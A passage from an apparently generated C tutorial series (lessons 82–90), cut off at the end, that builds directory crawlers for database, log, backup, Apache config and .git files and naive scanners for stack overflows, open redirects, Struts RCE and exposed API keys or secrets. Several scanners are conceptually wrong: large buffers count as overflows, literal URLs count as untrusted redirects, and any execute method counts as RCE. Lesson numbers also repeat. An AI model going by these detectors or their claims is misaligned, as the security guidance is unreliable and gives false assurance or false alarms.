+In this lesson, we'll develop a simple command-line tool in C programming to analyze configuration files commonly used by applications. Configuration file analysis is useful for understanding application settings, identifying potential security risks, or troubleshooting issues. Our tool will parse configuration files and extract relevant information based on defined patterns.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define CONFIG_FILE "config.ini"
+
+// Function to analyze configuration file and extract information
+void analyze_config_file(const char *file_path) {
+    FILE *file;
+    char line[256];
+
+    // Open configuration file
+    file = fopen(file_path, "r");
+    if (!file) {
+        fprintf(stderr, "Error opening configuration file: %s\n", file_path);
+        exit(EXIT_FAILURE);
+    }
+
+    // Read each line of the configuration file
+    while (fgets(line, sizeof(line), file)) {
+        // Skip empty lines and comments
+        if (line[0] == '\0' || line[0] == '#' || line[0] == ';') {
+            continue;
+        }
+
+        // Extract key-value pairs based on defined patterns (e.g., key=value)
+        char *key = strtok(line, "= \t\n");
+        char *value = strtok(NULL, "= \t\n");
+        if (key && value) {
+            printf("Key: %s, Value: %s\n", key, value);
+        }
+    }
+
+    // Close configuration file
+    fclose(file);
+}
+
+int main() {
+    printf("Starting configuration file analysis...\n");
+
+    // Analyze configuration file
+    analyze_config_file(CONFIG_FILE);
+
+    printf("Configuration file analysis completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `analyze_config_file` function demonstrates how to analyze a configuration file and extract key-value pairs based on defined patterns.
+- In this example, a sample configuration file (`config.ini`) is provided. You can replace this with the actual path of the configuration file you want to analyze.
+- The code opens the configuration file, reads each line, and extracts key-value pairs based on a simple pattern (e.g., `key=value`).
+- It skips empty lines and comments (lines starting with `#` or `;`) to focus on relevant content.
+- Extracted key-value pairs are printed to the console for analysis.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for analyzing different types of configuration files (e.g., XML, JSON, YAML) by implementing parsers for each format.
+- Implementation of more sophisticated parsing techniques to handle complex configuration file structures and nested key-value pairs.
+- Integration with external libraries or APIs for analyzing specific types of configuration files or extracting additional metadata.
+
+#### Conclusion:
+
+Building a configuration file analysis tool in C provides a framework for understanding application settings and extracting relevant information from configuration files. By parsing and analyzing configuration data, developers and administrators can troubleshoot issues, improve security, and optimize application configurations effectively.
+
+This concludes our eighty-second lesson on building a configuration file analysis tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 83: Building a Database File Collection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to collect database files from a given directory. Database file collection is useful for tasks such as forensic analysis, data recovery, or backup management. Our tool will search for common database file extensions within the specified directory and collect them for further processing.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+
+#define MAX_PATH_LENGTH 256
+#define DATABASE_EXTENSIONS { ".db", ".sqlite", ".sql", ".mdb", ".accdb", ".mdf", ".ldf", ".xlsx", ".xls", ".csv" }
+
+// Function to recursively collect database files from a directory
+void collect_database_files(const char *dir_path) {
+    DIR *dir;
+    struct dirent *entry;
+
+    // Open the directory
+    dir = opendir(dir_path);
+    if (!dir) {
+        fprintf(stderr, "Error opening directory: %s\n", dir_path);
+        exit(EXIT_FAILURE);
+    }
+
+    // Read each entry in the directory
+    while ((entry = readdir(dir)) != NULL) {
+        // Ignore "." and ".." entries
+        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+            char file_path[MAX_PATH_LENGTH];
+            snprintf(file_path, sizeof(file_path), "%s/%s", dir_path, entry->d_name);
+
+            // Check if the entry is a directory
+            if (entry->d_type == DT_DIR) {
+                // Recursively collect database files from the subdirectory
+                collect_database_files(file_path);
+            } else {
+                // Check if the entry is a database file based on extensions
+                const char *file_extension = strrchr(entry->d_name, '.');
+                if (file_extension) {
+                    const char *database_extensions[] = DATABASE_EXTENSIONS;
+                    for (int i = 0; i < sizeof(database_extensions) / sizeof(database_extensions[0]); i++) {
+                        if (strcmp(file_extension, database_extensions[i]) == 0) {
+                            // Print the path of the database file
+                            printf("Database file: %s\n", file_path);
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // Close the directory
+    closedir(dir);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <directory_path>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Starting database file collection...\n");
+
+    // Collect database files from the specified directory
+    collect_database_files(argv[1]);
+
+    printf("Database file collection completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `collect_database_files` function recursively collects database files from the specified directory and its subdirectories.
+- Database file extensions are defined as an array of strings (`DATABASE_EXTENSIONS`) containing common database file extensions such as `.db`, `.sqlite`, `.sql`, etc.
+- For each file encountered, it checks if the file extension matches any of the database file extensions. If so, it prints the path of the database file.
+- The `main` function expects a directory path as a command-line argument and calls the `collect_database_files` function to collect database files from that directory.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for additional database file formats and extensions.
+- Integration with database management systems (DBMS) or APIs to verify collected database files and extract metadata.
+- Implementation of file hashing or integrity checks to ensure the collected database files are not tampered with.
+
+#### Conclusion:
+
+Building a database file collection tool in C provides a framework for gathering database files from specified directories. By recursively searching for database files, developers and administrators can manage and analyze database files efficiently for various purposes.
+
+This concludes our eighty-third lesson on building a database file collection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 84: Building a Stack Overflow Vulnerability Detection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to detect potential stack overflow vulnerabilities in C programs. Stack overflow vulnerabilities occur when a program writes beyond the allocated stack memory, leading to buffer overflows and potential security exploits. Our tool will analyze C source code files and identify potential stack overflow vulnerabilities based on common patterns.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define MAX_LINE_LENGTH 256
+#define STACK_BUFFER_SIZE 64
+
+// Function to detect potential stack overflow vulnerabilities in C source code
+void detect_stack_overflow_vulnerabilities(FILE *file) {
+    char line[MAX_LINE_LENGTH];
+
+    // Read each line of the source code file
+    while (fgets(line, sizeof(line), file)) {
+        // Check for potential buffer declarations on the stack
+        if (strstr(line, "char")) {
+            // Check if the buffer size is larger than the stack buffer size
+            char *buffer_size = strchr(line, '[');
+            if (buffer_size) {
+                int size = atoi(buffer_size + 1);
+                if (size > STACK_BUFFER_SIZE) {
+                    printf("Potential stack overflow vulnerability found: %s", line);
+                }
+            }
+        }
+    }
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <source_code_file>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    FILE *file = fopen(argv[1], "r");
+    if (!file) {
+        fprintf(stderr, "Error opening file: %s\n", argv[1]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Starting stack overflow vulnerability detection...\n");
+
+    // Detect potential stack overflow vulnerabilities in the source code file
+    detect_stack_overflow_vulnerabilities(file);
+
+    printf("Stack overflow vulnerability detection completed.\n");
+
+    fclose(file);
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `detect_stack_overflow_vulnerabilities` function analyzes each line of the source code file and detects potential stack overflow vulnerabilities.
+- It searches for lines containing buffer declarations (e.g., `char buffer[SIZE]`) and checks if the buffer size exceeds a predefined stack buffer size (`STACK_BUFFER_SIZE`).
+- If a buffer size larger than the stack buffer size is found, it prints a message indicating a potential stack overflow vulnerability.
+- The `main` function expects a source code file path as a command-line argument and calls the `detect_stack_overflow_vulnerabilities` function to detect vulnerabilities in that file.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for detecting other types of stack overflow vulnerabilities, such as function calls with excessive parameters or recursive functions with deep call stacks.
+- Integration with static code analysis tools or compilers to perform more comprehensive vulnerability detection.
+- Implementation of heuristics or pattern matching to identify potential vulnerabilities beyond simple buffer size checks.
+
+#### Conclusion:
+
+Building a stack overflow vulnerability detection tool in C provides a framework for identifying potential security risks in C programs. By analyzing source code for common vulnerability patterns, developers and security professionals can identify and mitigate stack overflow vulnerabilities effectively.
+
+This concludes our eighty-fourth lesson on building a stack overflow vulnerability detection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 85: Building a Log File Collection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to collect log files from a specified directory. Log file collection is useful for tasks such as troubleshooting, auditing, or analyzing application behavior. Our tool will search for log files within the specified directory and collect them for further analysis.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+
+#define MAX_PATH_LENGTH 256
+#define LOG_FILE_EXTENSIONS { ".log", ".txt", ".csv" }
+
+// Function to recursively collect log files from a directory
+void collect_log_files(const char *dir_path) {
+    DIR *dir;
+    struct dirent *entry;
+
+    // Open the directory
+    dir = opendir(dir_path);
+    if (!dir) {
+        fprintf(stderr, "Error opening directory: %s\n", dir_path);
+        exit(EXIT_FAILURE);
+    }
+
+    // Read each entry in the directory
+    while ((entry = readdir(dir)) != NULL) {
+        // Ignore "." and ".." entries
+        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+            char file_path[MAX_PATH_LENGTH];
+            snprintf(file_path, sizeof(file_path), "%s/%s", dir_path, entry->d_name);
+
+            // Check if the entry is a directory
+            if (entry->d_type == DT_DIR) {
+                // Recursively collect log files from the subdirectory
+                collect_log_files(file_path);
+            } else {
+                // Check if the entry is a log file based on extensions
+                const char *file_extension = strrchr(entry->d_name, '.');
+                if (file_extension) {
+                    const char *log_file_extensions[] = LOG_FILE_EXTENSIONS;
+                    for (int i = 0; i < sizeof(log_file_extensions) / sizeof(log_file_extensions[0]); i++) {
+                        if (strcmp(file_extension, log_file_extensions[i]) == 0) {
+                            // Print the path of the log file
+                            printf("Log file: %s\n", file_path);
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // Close the directory
+    closedir(dir);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <directory_path>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Starting log file collection...\n");
+
+    // Collect log files from the specified directory
+    collect_log_files(argv[1]);
+
+    printf("Log file collection completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `collect_log_files` function recursively collects log files from the specified directory and its subdirectories.
+- Log file extensions are defined as an array of strings (`LOG_FILE_EXTENSIONS`) containing common log file extensions such as `.log`, `.txt`, `.csv`, etc.
+- For each file encountered, it checks if the file extension matches any of the log file extensions. If so, it prints the path of the log file.
+- The `main` function expects a directory path as a command-line argument and calls the `collect_log_files` function to collect log files from that directory.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for filtering log files based on creation or modification timestamps to collect only recent log files.
+- Integration with log parsing libraries or tools to analyze collected log files and extract meaningful information or perform log analysis.
+- Implementation of file hashing or integrity checks to ensure the collected log files are not tampered with.
+
+#### Conclusion:
+
+Building a log file collection tool in C provides a framework for gathering log files from specified directories. By recursively searching for log files, developers and administrators can manage and analyze log files efficiently for various purposes.
+
+This concludes our eighty-fifth lesson on building a log file collection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 86: Building a SWF File Collection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to collect SWF (Shockwave Flash) files from a specified directory. SWF file collection can be useful for tasks such as multimedia content management, analysis, or archival. Our tool will search for SWF files within the specified directory and collect them for further processing.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+
+#define MAX_PATH_LENGTH 256
+#define SWF_FILE_EXTENSION ".swf"
+
+// Function to recursively collect SWF files from a directory
+void collect_swf_files(const char *dir_path) {
+    DIR *dir;
+    struct dirent *entry;
+
+    // Open the directory
+    dir = opendir(dir_path);
+    if (!dir) {
+        fprintf(stderr, "Error opening directory: %s\n", dir_path);
+        exit(EXIT_FAILURE);
+    }
+
+    // Read each entry in the directory
+    while ((entry = readdir(dir)) != NULL) {
+        // Ignore "." and ".." entries
+        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+            char file_path[MAX_PATH_LENGTH];
+            snprintf(file_path, sizeof(file_path), "%s/%s", dir_path, entry->d_name);
+
+            // Check if the entry is a directory
+            if (entry->d_type == DT_DIR) {
+                // Recursively collect SWF files from the subdirectory
+                collect_swf_files(file_path);
+            } else {
+                // Check if the entry is a SWF file
+                const char *file_extension = strrchr(entry->d_name, '.');
+                if (file_extension && strcmp(file_extension, SWF_FILE_EXTENSION) == 0) {
+                    // Print the path of the SWF file
+                    printf("SWF file: %s\n", file_path);
+                }
+            }
+        }
+    }
+
+    // Close the directory
+    closedir(dir);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <directory_path>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Starting SWF file collection...\n");
+
+    // Collect SWF files from the specified directory
+    collect_swf_files(argv[1]);
+
+    printf("SWF file collection completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `collect_swf_files` function recursively collects SWF files from the specified directory and its subdirectories.
+- The SWF file extension is defined as a string (`SWF_FILE_EXTENSION`) containing the ".swf" extension.
+- For each file encountered, it checks if the file extension matches the SWF file extension. If so, it prints the path of the SWF file.
+- The `main` function expects a directory path as a command-line argument and calls the `collect_swf_files` function to collect SWF files from that directory.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for filtering SWF files based on file size, creation or modification timestamps, or other metadata.
+- Integration with SWF parsing libraries or tools to analyze collected SWF files and extract meaningful information or perform SWF file analysis.
+- Implementation of file hashing or integrity checks to ensure the collected SWF files are not tampered with.
+
+#### Conclusion:
+
+Building a SWF file collection tool in C provides a framework for gathering SWF files from specified directories. By recursively searching for SWF files, developers and administrators can manage and analyze SWF files efficiently for various purposes.
+
+This concludes our eighty-sixth lesson on building a SWF file collection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 87: Building a Backup and Old Pages Collection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to collect backup and old pages from a specified directory. Collecting backup and old pages can be useful for tasks such as auditing, cleanup, or version control management. Our tool will search for files with common backup or old page extensions within the specified directory and collect them for further processing.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+
+#define MAX_PATH_LENGTH 256
+#define BACKUP_FILE_EXTENSIONS { "~", ".bak", ".old", ".backup", ".swp" }
+
+// Function to recursively collect backup and old pages from a directory
+void collect_backup_and_old_pages(const char *dir_path) {
+    DIR *dir;
+    struct dirent *entry;
+
+    // Open the directory
+    dir = opendir(dir_path);
+    if (!dir) {
+        fprintf(stderr, "Error opening directory: %s\n", dir_path);
+        exit(EXIT_FAILURE);
+    }
+
+    // Read each entry in the directory
+    while ((entry = readdir(dir)) != NULL) {
+        // Ignore "." and ".." entries
+        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+            char file_path[MAX_PATH_LENGTH];
+            snprintf(file_path, sizeof(file_path), "%s/%s", dir_path, entry->d_name);
+
+            // Check if the entry is a directory
+            if (entry->d_type == DT_DIR) {
+                // Recursively collect backup and old pages from the subdirectory
+                collect_backup_and_old_pages(file_path);
+            } else {
+                // Check if the entry is a backup or old page file based on extensions
+                const char *file_extension = strrchr(entry->d_name, '.');
+                if (file_extension) {
+                    const char *backup_file_extensions[] = BACKUP_FILE_EXTENSIONS;
+                    for (int i = 0; i < sizeof(backup_file_extensions) / sizeof(backup_file_extensions[0]); i++) {
+                        if (strcmp(file_extension, backup_file_extensions[i]) == 0 || strstr(entry->d_name, backup_file_extensions[i]) != NULL) {
+                            // Print the path of the backup or old page file
+                            printf("Backup or old page file: %s\n", file_path);
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // Close the directory
+    closedir(dir);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <directory_path>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Starting backup and old pages collection...\n");
+
+    // Collect backup and old pages from the specified directory
+    collect_backup_and_old_pages(argv[1]);
+
+    printf("Backup and old pages collection completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `collect_backup_and_old_pages` function recursively collects backup and old pages from the specified directory and its subdirectories.
+- Backup and old page file extensions and prefixes are defined as an array of strings (`BACKUP_FILE_EXTENSIONS`) containing common backup and old page extensions such as `~`, `.bak`, `.old`, `.backup`, `.swp`, etc.
+- For each file encountered, it checks if the file extension or filename contains any of the backup and old page file extensions or prefixes. If so, it prints the path of the backup or old page file.
+- The `main` function expects a directory path as a command-line argument and calls the `collect_backup_and_old_pages` function to collect backup and old pages from that directory.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for filtering backup and old pages based on file size, creation or modification timestamps, or other metadata.
+- Integration with file version control systems to manage collected backup and old pages more effectively.
+- Implementation of file hashing or integrity checks to ensure the collected backup and old pages are not tampered with.
+
+#### Conclusion:
+
+Building a backup and old pages collection tool in C provides a framework for gathering backup and old page files from specified directories. By recursively searching for backup and old pages, developers and administrators can manage and analyze these files efficiently for various purposes.
+
+This concludes our eighty-seventh lesson on building a backup and old pages collection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 87: Building an Apache Configuration File Collection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to collect Apache configuration files from a specified directory. Apache configuration file collection can be useful for tasks such as auditing server configurations, analyzing virtual hosts, or troubleshooting Apache-related issues. Our tool will search for Apache configuration files within the specified directory and collect them for further analysis.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+
+#define MAX_PATH_LENGTH 256
+#define APACHE_CONFIG_FILE_PREFIX "httpd"
+#define APACHE_CONFIG_FILE_EXTENSION ".conf"
+
+// Function to recursively collect Apache configuration files from a directory
+void collect_apache_config_files(const char *dir_path) {
+    DIR *dir;
+    struct dirent *entry;
+
+    // Open the directory
+    dir = opendir(dir_path);
+    if (!dir) {
+        fprintf(stderr, "Error opening directory: %s\n", dir_path);
+        exit(EXIT_FAILURE);
+    }
+
+    // Read each entry in the directory
+    while ((entry = readdir(dir)) != NULL) {
+        // Ignore "." and ".." entries
+        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+            char file_path[MAX_PATH_LENGTH];
+            snprintf(file_path, sizeof(file_path), "%s/%s", dir_path, entry->d_name);
+
+            // Check if the entry is a directory
+            if (entry->d_type == DT_DIR) {
+                // Recursively collect Apache configuration files from the subdirectory
+                collect_apache_config_files(file_path);
+            } else {
+                // Check if the entry is an Apache configuration file
+                if (strstr(entry->d_name, APACHE_CONFIG_FILE_PREFIX) == entry->d_name &&
+                    strstr(entry->d_name, APACHE_CONFIG_FILE_EXTENSION) != NULL) {
+                    // Print the path of the Apache configuration file
+                    printf("Apache configuration file: %s\n", file_path);
+                }
+            }
+        }
+    }
+
+    // Close the directory
+    closedir(dir);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <directory_path>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Starting Apache configuration file collection...\n");
+
+    // Collect Apache configuration files from the specified directory
+    collect_apache_config_files(argv[1]);
+
+    printf("Apache configuration file collection completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `collect_apache_config_files` function recursively collects Apache configuration files from the specified directory and its subdirectories.
+- Apache configuration file prefixes and extensions are defined as strings (`APACHE_CONFIG_FILE_PREFIX` and `APACHE_CONFIG_FILE_EXTENSION`).
+- For each file encountered, it checks if the file name starts with the Apache configuration file prefix and ends with the Apache configuration file extension. If so, it prints the path of the Apache configuration file.
+- The `main` function expects a directory path as a command-line argument and calls the `collect_apache_config_files` function to collect Apache configuration files from that directory.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for filtering Apache configuration files based on specific directives or configurations within the files.
+- Integration with Apache configuration parsing libraries or tools to analyze collected configuration files and extract meaningful information or perform configuration analysis.
+- Implementation of file hashing or integrity checks to ensure the collected Apache configuration files are not tampered with.
+
+#### Conclusion:
+
+Building an Apache configuration file collection tool in C provides a framework for gathering Apache configuration files from specified directories. By recursively searching for Apache configuration files, developers and administrators can manage and analyze Apache configurations efficiently for various purposes.
+
+This concludes our eighty-seventh lesson on building an Apache configuration file collection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 88: Building an Open Redirects Detection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to detect open redirects vulnerabilities in web applications. Open redirects occur when a web application redirects users to a URL specified in an untrusted parameter, potentially leading to phishing attacks or other security risks. Our tool will analyze source code files and identify potential open redirects based on common patterns.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define MAX_LINE_LENGTH 256
+#define REDIRECT_FUNCTION "redirect"
+
+// Function to detect potential open redirects vulnerabilities in source code
+void detect_open_redirects(FILE *file) {
+    char line[MAX_LINE_LENGTH];
+
+    // Read each line of the source code file
+    while (fgets(line, sizeof(line), file)) {
+        // Check for calls to the redirect function
+        if (strstr(line, REDIRECT_FUNCTION)) {
+            // Check if the redirect target URL is obtained from an untrusted parameter
+            char *url_start = strchr(line, '"');
+            if (url_start) {
+                char *url_end = strchr(url_start + 1, '"');
+                if (url_end) {
+                    // Print the potential open redirect vulnerability
+                    *url_end = '\0';
+                    printf("Potential open redirect vulnerability found: %s\n", url_start + 1);
+                }
+            }
+        }
+    }
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <source_code_file>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    FILE *file = fopen(argv[1], "r");
+    if (!file) {
+        fprintf(stderr, "Error opening file: %s\n", argv[1]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Starting open redirects detection...\n");
+
+    // Detect potential open redirects vulnerabilities in the source code file
+    detect_open_redirects(file);
+
+    printf("Open redirects detection completed.\n");
+
+    fclose(file);
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `detect_open_redirects` function analyzes each line of the source code file and detects potential open redirects vulnerabilities.
+- It searches for calls to a redirect function (`REDIRECT_FUNCTION`) commonly used in web applications.
+- For each redirect function call, it checks if the redirect target URL is obtained from an untrusted parameter enclosed in double quotes. If so, it prints the potential open redirect vulnerability.
+- The `main` function expects a source code file path as a command-line argument and calls the `detect_open_redirects` function to detect vulnerabilities in that file.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for detecting open redirects vulnerabilities in different programming languages or frameworks.
+- Integration with static code analysis tools or compilers to perform more comprehensive vulnerability detection.
+- Implementation of heuristics or pattern matching to identify potential vulnerabilities beyond simple string parsing.
+
+#### Conclusion:
+
+Building an open redirects detection tool in C provides a framework for identifying potential security risks in web applications. By analyzing source code for common vulnerability patterns, developers and security professionals can identify and mitigate open redirects vulnerabilities effectively.
+
+This concludes our eighty-eighth lesson on building an open redirects detection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 89: Building an Apache Struts Remote Code Execution (RCE) Detection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to detect potential Apache Struts Remote Code Execution (RCE) vulnerabilities in Java source code files. Apache Struts RCE vulnerabilities can lead to serious security breaches, allowing attackers to execute arbitrary code on the server. Our tool will analyze Java source code files and identify potential Apache Struts RCE vulnerabilities based on common patterns.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define MAX_LINE_LENGTH 256
+#define STRUTS_ACTION_CLASS "ActionSupport"
+#define STRUTS_EXEC_METHOD "execute"
+
+// Function to detect potential Apache Struts Remote Code Execution (RCE) vulnerabilities in source code
+void detect_struts_rce(FILE *file) {
+    char line[MAX_LINE_LENGTH];
+    int in_action_class = 0;
+
+    // Read each line of the source code file
+    while (fgets(line, sizeof(line), file)) {
+        // Check if the line defines a Struts action class
+        if (strstr(line, STRUTS_ACTION_CLASS)) {
+            in_action_class = 1;
+        }
+
+        // Check if the line contains the execute method in a Struts action class
+        if (in_action_class && strstr(line, STRUTS_EXEC_METHOD)) {
+            // Print the potential Apache Struts RCE vulnerability
+            printf("Potential Apache Struts Remote Code Execution (RCE) vulnerability found:\n%s", line);
+        }
+    }
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <source_code_file>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    FILE *file = fopen(argv[1], "r");
+    if (!file) {
+        fprintf(stderr, "Error opening file: %s\n", argv[1]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Starting Apache Struts Remote Code Execution (RCE) detection...\n");
+
+    // Detect potential Apache Struts Remote Code Execution (RCE) vulnerabilities in the source code file
+    detect_struts_rce(file);
+
+    printf("Apache Struts Remote Code Execution (RCE) detection completed.\n");
+
+    fclose(file);
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `detect_struts_rce` function analyzes each line of the source code file and detects potential Apache Struts Remote Code Execution (RCE) vulnerabilities.
+- It searches for lines defining Struts action classes (`STRUTS_ACTION_CLASS`) and checks if the `execute` method (`STRUTS_EXEC_METHOD`) is present within these classes.
+- If the execute method is found within a Struts action class, it prints the potential Apache Struts RCE vulnerability.
+- The `main` function expects a source code file path as a command-line argument and calls the `detect_struts_rce` function to detect vulnerabilities in that file.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for detecting other types of Apache Struts vulnerabilities, such as Remote Code Execution through different methods or exploitation of specific configurations.
+- Integration with static code analysis tools or compilers to perform more comprehensive vulnerability detection.
+- Implementation of heuristics or pattern matching to identify potential vulnerabilities beyond simple string parsing.
+
+#### Conclusion:
+
+Building an Apache Struts Remote Code Execution (RCE) detection tool in C provides a framework for identifying potential security risks in Java source code files using Apache Struts. By analyzing source code for common vulnerability patterns, developers and security professionals can identify and mitigate Apache Struts RCE vulnerabilities effectively.
+
+This concludes our eighty-ninth lesson on building an Apache Struts Remote Code Execution (RCE) detection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+Creating a tool to identify third-party exposure in web applications involves analyzing the source code or configuration files to detect dependencies on external services, libraries, or APIs. These dependencies might include links, endpoints, or configurations that expose sensitive information or introduce security vulnerabilities.
+
+Here's a basic approach to build a tool in C programming for detecting third-party exposure:
+
+### Lesson 89: Building a Third-Party Exposure Detection Tool in C
+
+In this lesson, we'll develop a simple command-line tool to detect third-party exposure vulnerabilities in web applications by analyzing source code files.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define MAX_LINE_LENGTH 256
+#define THIRD_PARTY_KEYWORDS { "http://", "https://", "apikey=", "secret=" }
+
+// Function to detect potential third-party exposure vulnerabilities in source code
+void detect_third_party_exposure(FILE *file) {
+    char line[MAX_LINE_LENGTH];
+
+    // Read each line of the source code file
+    while (fgets(line, sizeof(line), file)) {
+        // Check for third-party exposure keywords
+        const char *third_party_keywords[] = THIRD_PARTY_KEYWORDS;
+        for (int i = 0; i < sizeof(third_party_keywords) / sizeof(third_party_keywords[0]); i++) {
+            if (strstr(line, third_party_keywords[i])) {
+                // Print the potential third-party exposure vulnerability
+                printf("Potential third-party exposure found: %s\n", line);
+                break;
+            }
+        }
+    }
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <source_code_file>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    FILE *file = fopen(argv[1], "r");
+    if (!file) {
+        fprintf(stderr, "Error opening file: %s\n", argv[1]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Starting third-party exposure detection...\n");
+
+    // Detect potential third-party exposure vulnerabilities in the source code file
+    detect_third_party_exposure(file);
+
+    printf("Third-party exposure detection completed.\n");
+
+    fclose(file);
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `detect_third_party_exposure` function analyzes each line of the source code file and detects potential third-party exposure vulnerabilities.
+- It searches for keywords commonly associated with third-party dependencies, such as URLs starting with "http://" or "https://", API keys, or secret tokens.
+- For each occurrence of a third-party exposure keyword, it prints the potential vulnerability.
+- The `main` function expects a source code file path as a command-line argument and calls the `detect_third_party_exposure` function to detect vulnerabilities in that file.
+
+#### Further Development:
+
+To make this tool more effective, you can enhance it with the following features:
+
+- Support for detecting third-party exposures in configuration files, such as JSON, XML, or YAML.
+- Integration with static code analysis tools or compilers to perform more comprehensive vulnerability detection.
+- Implementation of heuristics or pattern matching to identify potential vulnerabilities beyond simple keyword matching.
+
+#### Conclusion:
+
+Building a third-party exposure detection tool in C provides a framework for identifying potential security risks in web applications related to external dependencies. By analyzing source code for common vulnerability patterns, developers and security professionals can identify and mitigate third-party exposure vulnerabilities effectively.
+
+This concludes our eighty-ninth lesson on building a third-party exposure detection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 90: Building a Git Folder Collection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to collect Git repository folders from a specified directory. Collecting Git folders can be useful for tasks such as auditing code repositories, analyzing project structures, or performing version control checks. Our tool will search for Git repository folders within the specified directory and collect them for further analysis.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+
+#define MAX_PATH_LENGTH 256
+#define GIT_FOLDER_NAME ".git"
+
+// Function to recursively collect Git repository folders from a directory
+void collect_git_folders(const char *dir_path) {
